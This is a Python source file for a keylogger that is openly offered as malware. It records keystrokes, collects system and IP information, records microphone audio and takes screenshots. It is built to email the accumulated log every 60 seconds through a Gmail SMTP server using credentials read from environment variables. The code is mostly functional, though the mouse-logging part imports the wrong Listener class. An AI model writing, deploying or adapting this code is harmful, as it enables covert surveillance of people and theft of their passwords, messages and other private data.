import logging
import os
import platform
import smtplib
import socket
import threading
import time
import wave
import datetime
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders

# Load email credentials from environment variables for security
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
SEND_REPORT_EVERY = 60  # Send report every 60 seconds

# Log file path (you can change this path)
LOG_FILE_PATH = "keylogger_log.txt"

# Setup logging to file
logging.basicConfig(filename="keylogger.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password
        print("[INFO] Keylogger initialized.")

    # Add data to the log
    def appendlog(self, string):
        self.log = self.log + string
        print(f"[DEBUG] Logged data: {string.strip()}")

    # Write log data to a file
    def write_to_file(self):
        with open(LOG_FILE_PATH, "a") as log_file:  # Open file in append mode
            log_file.write(self.log)
        print(f"[INFO] Log data written to {LOG_FILE_PATH}")

    # Capture mouse movement and add to the log
    def on_move(self, x, y):
        current_move = f"Mouse moved to {x}, {y}\n"
        self.appendlog(current_move)

    # Capture mouse click and add to the log
    def on_click(self, x, y, button, pressed):
        if pressed:
            current_click = f"Mouse clicked at {x}, {y} with {button}\n"
            self.appendlog(current_click)

    # Capture mouse scroll and add to the log
    def on_scroll(self, x, y, dx, dy):
        current_scroll = f"Mouse scrolled at {x}, {y}\n"
        self.appendlog(current_scroll)

    # Capture key presses and add to the log
    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    # Send email with the keylogger report
    def send_mail(self, subject, message, attachment=None):
        sender = self.email
        receiver = self.email

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        if attachment:
            with open(attachment, "rb") as attach_file:
                part = MIMEBase("application", "octet-stream")
                part.set_payload(attach_file.read())
                encoders.encode_base64(part)
                part.add_header("Content-Disposition", f"attachment; filename={os.path.basename(attachment)}")
                msg.attach(part)

        smtp_server = "smtp.gmail.com"  # Use your own SMTP server (e.g. smtp.gmail.com)
        smtp_port = 587  # Change according to the SMTP server used (465 for SSL)

        try:
            with smtplib.SMTP(smtp_server, smtp_port) as server:
                server.starttls()  # Upgrade to secure connection
                server.login(self.email, self.password)
                server.send_message(msg)
                print(f"[INFO] Email sent to {receiver}.")
        except Exception as e:
            print(f"[ERROR] Failed to send email: {e}")

    # Send the log report via email and save to file
    def report(self):
        print("[INFO] Sending report...")
        self.send_mail("Keylogger Report", self.log)
        self.write_to_file()  # Save log to file
        self.log = ""  # Clear log after sending
        self.screenshot()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    # Collect system information and add to the log
    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(f"Hostname: {hostname}\n")
        self.appendlog(f"IP Address: {ip}\n")
        self.appendlog(f"Processor: {plat}\n")
        self.appendlog(f"System: {system}\n")
        self.appendlog(f"Machine: {machine}\n")
        print(f"[INFO] System information collected: {hostname}, {ip}")

    # Record microphone audio and save as .wav
    def microphone(self):
        fs = 44100  # Sample rate
        seconds = 10  # Duration of recording
        wave_file_path = f'sound_{int(time.time())}.wav'

        try:
            # Log the start of recording
            print("[DEBUG] Starting audio recording...")
            self.appendlog("Recording audio...\n")
        
            # Record audio from the microphone
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1, dtype='float32')
            sd.wait()  # Wait until the recording is finished
        
            # Log the completion of recording
            print("[DEBUG] Audio recording complete...")
            self.appendlog("Recording complete.\n")

           # Save the recorded audio to a .wav file
            with wave.open(wave_file_path, 'wb') as wave_file:
                wave_file.setnchannels(1)
                wave_file.setsampwidth(4)  # 2 bytes per sample
                wave_file.setframerate(fs)
                wave_file.writeframes(myrecording.tobytes())
        
            # Log the file saving process
            self.appendlog(f"Audio saved to {wave_file_path}\n")
            print(f"[INFO] Audio saved to {wave_file_path}")
    
        except Exception as e:
            # Log any error that occurs during the recording process
            self.appendlog(f"[ERROR] Failed to record audio: {e}\n")
            print(f"[ERROR] Failed to record audio: {e}")    


    # Capture screenshot and save as an image file
    def screenshot(self):
        # Get the current timestamp to create a unique filename
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"  # Unique filename based on timestamp
        img = pyscreenshot.grab()
        img.save(filename)
        print(f"[INFO] Screenshot saved as {filename}")   
        
    # Start the keylogger, capturing keystrokes and sending periodic reports
    def run(self):
        try:
            print("[INFO] Starting keylogger...")
            # Start keyboard listener
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()  # Send the first report after the interval
                keyboard_listener.join()

            # Start mouse listener
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()

        except KeyboardInterrupt:
            print("\n[INFO] Keylogger terminated by user.")
            logging.info("Keylogger stopped by user.")


# Start the keylogger
if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.system_information()
    keylogger.microphone() 
    keylogger.run()
